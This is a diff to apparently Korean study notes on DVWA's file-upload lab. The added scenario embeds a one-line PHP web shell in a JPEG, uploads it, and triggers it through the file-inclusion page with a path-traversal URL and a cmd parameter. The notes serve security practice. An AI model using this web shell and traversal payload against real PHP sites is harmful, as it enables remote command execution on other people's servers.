@@ -149,3 +149,23 @@ if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to�
 **소스 코드 문제**
 1. upload 경로 위치 ->  web root
 2. 이미지 파일이기 때문에 100% 안전하지 않음
+
+
+
+
+*시나리오*
+1. 이미지 jpeg 파일을 rocky linux로 복사
+2. 아래 명령어 실행
+	>PHP 악성 코드가 들어 있는 jpg 파일
+  3. 해당 jpg 파일을 upload
+  4. File Inclusion에서 아래 명령어 url 입력 시 cmd 실행되는 점 확인
+
+```
+echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
+
+dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
+```
+
+**실행 결과**
+
+![](../Images/Pasted%20image%2020260803143219.png)
